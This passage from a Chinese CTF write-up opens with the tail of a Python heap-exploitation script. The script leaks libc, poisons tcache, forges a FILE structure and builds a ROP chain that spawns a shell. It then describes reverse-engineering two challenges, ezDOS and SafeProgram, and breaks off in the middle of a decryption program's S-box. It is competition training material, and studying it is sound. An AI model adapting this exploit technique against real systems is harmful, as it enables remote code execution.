sla<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">view</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">"4"</span><span class="token punctuation">)</span>
sla<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">)</span>
sla<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
sla<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    free<span class="token punctuation">(</span>i<span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x300</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>

view<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
libc<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x203b00</span>
<span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">)</span>

view<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
heap<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x1200</span>
<span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>heap<span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">"/bin/sh\0"</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment">#7</span>
add<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>

stdout<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x2045c0</span>
io_list_all<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x2044c0</span>
target<span class="token operator">=</span><span class="token punctuation">(</span>io_list_all<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>heap<span class="token operator">+</span><span class="token number">0x1060</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">12</span>
target1<span class="token operator">=</span><span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>heap<span class="token operator">+</span><span class="token number">0x1080</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">12</span>

p<span class="token operator">=</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>target<span class="token punctuation">)</span>
p<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x111</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>target1<span class="token punctuation">)</span>

fake_io_addr<span class="token operator">=</span>heap<span class="token operator">+</span><span class="token number">0xd20</span>

edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>fake_io_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

system<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x58750</span>
environ<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x20ad58</span>
_IO_wfile_jumps<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x202228</span>
setcontext<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x4a99d</span>

rop_addr<span class="token operator">=</span>heap<span class="token operator">+</span><span class="token number">0x850</span>
rax<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0xdd237</span>
rdi<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x158748</span>
rsi<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x02b46b</span>
syscall<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x127185</span><span class="token operator">+</span><span class="token number">4</span>
rsp<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x5ef6f</span>
rdx<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x162e3a</span>

rop<span class="token operator">=</span>p64<span class="token punctuation">(</span>rax<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>
rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">5</span>
rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>
rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>

rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rax<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>
rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">5</span>
rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>
rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>

rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rax<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x3b</span><span class="token punctuation">)</span>
rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap<span class="token operator">+</span><span class="token number">0xd20</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">5</span>
rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap<span class="token operator">+</span><span class="token number">0x978</span><span class="token operator">+</span><span class="token number">0x28</span><span class="token punctuation">)</span>
rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rdx<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap<span class="token operator">+</span><span class="token number">0x978</span><span class="token operator">+</span><span class="token number">0x28</span><span class="token punctuation">)</span>
rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>

edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> rop<span class="token punctuation">)</span>

fake_io <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
    <span class="token number">0x0</span><span class="token punctuation">:</span> <span class="token string">" sh;"</span><span class="token punctuation">,</span>
    <span class="token number">0x10</span><span class="token punctuation">:</span> p64<span class="token punctuation">(</span>setcontext<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token number">0x20</span><span class="token punctuation">:</span> p64<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token number">0x88</span><span class="token punctuation">:</span> p64<span class="token punctuation">(</span>rop_addr<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># _lock</span>
    <span class="token number">0xa0</span><span class="token punctuation">:</span> p64<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token number">0xa8</span><span class="token punctuation">:</span> p64<span class="token punctuation">(</span>rsp<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token number">0xd8</span><span class="token punctuation">:</span> p64<span class="token punctuation">(</span>_IO_wfile_jumps <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token number">0xe0</span><span class="token punctuation">:</span> p64<span class="token punctuation">(</span>stdout<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> filler<span class="token operator">=</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span>


add<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">,</span> fake_io<span class="token punctuation">)</span>
shell<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>



<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="ezDOS"><a href="#ezDOS" class="headerlink" title="ezDOS"></a>ezDOS</h3><p>程序中间出现的花指令都直接nop去除，然后Apply patch到程序。</p>
<p><img src="/images/1742731823755-b823cf34-aab4-4fbe-bf7e-f53a4aaa3497.png" loading="lazy"></p>
<p>程序要求输入38长度字符串，然后进行一系列变种类RC4算法加密，然后与0x141地址的38字节数据进行比对。</p>
<p><img src="/images/1742732096513-faa2f920-70f8-4a36-93df-91f224f7c6d0.png" loading="lazy"></p>
<p>使用dosbox动调，在FA代码处是对取出的al对输入的字符串进行xor加密。0x32是取出的异或值，0x31是输入的字符’1’。</p>
<p><img src="/images/1742732287881-3999c9b7-5e31-4121-9f55-e2b906e10ccd.png" loading="lazy"></p>
<p><img src="/images/1742732249120-5fda8d14-cb9b-4f49-8bf6-614e6960dc63.png" loading="lazy"></p>
<p>直接debug一直循环执行这边，即可拿到对输入字符串异或的一系列异或值。</p>
<blockquote>
<p>32 7d 59 7a f3 0d b3 7b 64 8c eb 28 c4 a4 50 30 a0 ed 27 6a e3 76 69 0c da 28 f8 08 ba a6 17 3e 12 59 45 06 4e f1</p>
</blockquote>
<p>取出0x142地址的38字节，进行异或即可得到解密flag。</p>
<p><img src="/images/1742732520225-ea38e755-4155-4ff4-b845-9fd37b9bcc95.png" loading="lazy"></p>
<h3 id="SafeProgram"><a href="#SafeProgram" class="headerlink" title="SafeProgram"></a>SafeProgram</h3><p>核心加密是一个SM4加密。</p>
<p><img src="/images/1742733064140-f984f029-5c19-40da-96a2-7c9933518e4b.png" loading="lazy"></p>
<p>查看byte_14002A0D0数组交叉引用，发现在其他函数被访问过。</p>
<p><img src="/images/1742733138431-04584683-08b6-44f7-a471-1549be8e206e.png" loading="lazy"></p>
<p><img src="/images/1742733148877-755426b6-0cd4-4c98-86b0-49efafd7b7e6.png" loading="lazy"></p>
<p>发现是在VEH异常Handler里面调用的，第一个AddVectoredExceptionHandler得直接nop，不然运行就直接退出。</p>
<p><img src="/images/1742733208272-ce5e8263-86f4-4503-8a09-968a5e694740.png" loading="lazy"></p>
<p><img src="/images/1742733215267-dd1e9a92-33aa-4250-a846-4191f12379b8.png" loading="lazy"></p>
<p><img src="/images/1742733314872-bc3290b8-a385-47a3-965d-5477921a25a5.png" loading="lazy"></p>
<p>然后在这个函数开头断点，使用ScyllaHide插件一键去除反调试，防止其他地方的反调试。</p>
<p><img src="/images/1742733356084-873e99b1-43f0-4c23-9c16-33ce6afc2a5b.png" loading="lazy"></p>
<p>main函数可以看到要求输入格式为NCTF{…}的长度38字符串，然后运行到箭头函数会触发除0异常，然后就会触发VEH那个Handler导致那个byte数组被修改，需要提取的数据是被改后的。</p>
<p><img src="/images/1742733443971-e0cf12c7-c12a-48b3-b557-7ff20d700ec6.png" loading="lazy"></p>
<p>动调时提取这三个数组数据，进行解密即可。</p>
<p><img src="/images/1742733627618-776e5556-677d-4108-957a-8081f3a182ad.png" loading="lazy"></p>
<p>key是main函数两次memcpy那边的数据，结果如下。</p>
<p><img src="/images/1742733798575-ba99240d-931c-4963-aecb-87467e43e57a.png" loading="lazy"></p>
<p>解密代码：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector></span></span>

<span class="token keyword">unsigned</span> <span class="token keyword">char</span> byte_7FF699A4A0D0<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
<span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0xFE</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xE1</span><span class="token punctuation">,</span> <span class="token number">0x3D</span><span class="token punctuation">,</span> <span class="token number">0xB7</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">,</span> <span class="token number">0xB6</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0xC2</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0xFB</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span>
<span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x9A</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0xC3</span><span class="token punctuation">,</span> <span class="token number">0xAA</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span>
<span class="token number">0x9C</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0xF4</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0xEF</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0xED</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0xAC</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span>
<span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0xB3</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0xA9</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xDF</span><span class="token punctuation">,</span> <span class="token number">0x94</span><span class="token punctuation">,</span> <span class="token number">0xFA</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x8F</span><span class="token punctuation">,</span> <span class="token number">0x3F</span><span class="token punctuation">,</span> <span class="token number">0xA6</span><span class="token punctuation">,</span>
<span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0xA7</span><span class="token punctuation">,</span> <span class="token number">0x4F</span><span class="token punctuation">,</span> <span class="token number">0xF3</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0xBA</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0xE6</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0xD6</span><span class="token punctuation">,</span> <span class="token number">0xA8</span><span class="token punctuation">,</span>
<span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0xB2</span><span class="token punctuation">,</span> <span class="token number">0xFC</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0xDA</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token number">0xEB</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x9D</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span>
<span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0x9F</span><span class="token punctuation">,</span> <span class="token number">0xA2</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0xC9</span><span class="token punctuation">,</span> <span class="token number">0x87</span><span class="token punctuation">,</span>
<span class="token number">0xD4</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x5E</span><span class="token punctuation">,</span> <span class="token number">0xD3</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0xE7</span><span class="token punctuation">,</span> <span class="token number">0xA0</span><span class="token punctuation">,</span> <span class="token number">0xC4</span><span class="token punctuation">,</span> <span class="token number">0xC8</span><span class="token punctuation">,</span> <span class="token number">0x9E</span><span class="token punctuation">,</span>
<span class="token number">0xEA</span><span class="token punctuation">,</span> <span class="token number">0xBF</span><span class="token punctuation">,</span> <span class="token number">0x8A</span><span class="token punctuation">,</span> <span class="token number">0xD2</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0xC7</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0xB5</span><span class="token punctuation">,</span> <span class="token number">0xA3</span><span class="token punctuation">,</span> <span class="token number">0xF7</span><span class="token punctuation">,</span> <span class="token number">0xF2</span><span class="token punctuation">,</span> <span class="token number">0xCE</span><span class="token punctuation">,</span> <span class="token number">0xF9</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0xA1</span><span class="token punctuation">,</span>
<span class="token number">0xE0</span><span class="token punctuation">,</span> <span class="token number">0xAE</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0xA4</span><span class="token punctuation">,</span> <span class="token number">0x9B</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0xF5</span><span class="token punctuation">,</span> <span class="token number">0x8C</span><span class="token punctuation">,</span> <span class="token number">0xB1</span><span class="token punctuation">,</span> <span class="token number">0xE3</span><span class="token punctuation">,</span>
<span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0xF6</span><span class="token punctuation">,</span> <span class="token number">0xE2</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x82</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0xCA</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0xC0</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span> <span class="token number">0xAB</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span>
<span class="token number">0xD5</span><span class="token punctuation">,</span> <span class="token number">0xDB</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0xDE</span><span class="token punctuation">,</span> <span class="token number">0xFD</span><span class="token punctuation">,</span> <span class="token number">0x8E</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x6C</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span>
<span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0xAF</span><span class="token punctuation">,</span> <span class="token number">0x92</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0xDD</span><span class="token punctuation">,</span> <span class="token number">0xBC</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0xD9</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x1F</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0xD8</span><span class="token punctuation">,</span>
<span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0xA5</span><span class="token punctuation">,</span> <span class="token number">0xCD</span><span class="token punctuation">,</span> <span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token number">0xBD</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0xB8</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0xB4</span><span class="token punctuation">,</span> <span class="token number">0xB0</span><span class="token punctuation">,</span>
<span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x96</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0xB9</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0xC5</span><span class="token punctuation">,</span> <span class="token number">0x6E</span><span class="token punctuation">,</span> <span class="token number">0xC6</span><span class="token punctuation">,</span> <span class="token number">0x84</span><span class="token punctuation">,</span>
